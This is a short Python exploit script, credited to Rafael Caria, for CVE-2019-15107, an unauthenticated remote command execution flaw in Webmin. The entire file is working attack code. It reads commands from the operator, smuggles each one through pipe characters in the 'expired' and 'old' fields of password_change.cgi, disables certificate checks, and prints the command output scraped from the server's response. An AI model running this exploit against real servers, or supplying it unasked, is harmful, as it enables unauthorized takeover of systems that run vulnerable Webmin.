#!/usr/bin/env python3
import requests,urllib3,argparse

parser = argparse.ArgumentParser(description="[!] This script exploits (CVE-2019-15107) Webmin Unauhenticated Remote Command Execution. by Rafael Caria",formatter_class=lambda prog:argparse.HelpFormatter(prog,max_help_position=1000))
parser.add_argument("--rhost","-r",help="The target host, example: 127.0.0.1",type=str,required=True)
parser.add_argument("--rport","-p",help="The target port",type=int,required=True)
args = parser.parse_args()

print ("[+] Webmin Unauhenticated Remote Command Execution. By Rafael Caria")
def exploit(host,port):
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    rhost = (f'https://{host}:{port}/password_change.cgi')
    header = {"Referer":f"https://{host}:{port}/session_login.cgi"}
    while True:
        xpl = (input("Command: "))
        params = {
        "expired":f"2|{xpl}",
        "old":f"123|{xpl}",
        "new1":"wheel",
        "new2":"wheel",
        }
        try:
            r = requests.post(rhost,data=params,headers=header,verify=False)
            if (r.status_code == 200):
                print (r.text.split("incorrect")[1].split("</h")[0])
            elif (r.status_code == 500):
                print (r.text.split("chosen.")[1].split("</p")[0])
            else:
                return False
        except:
            pass
exploit(args.rhost,args.rport)
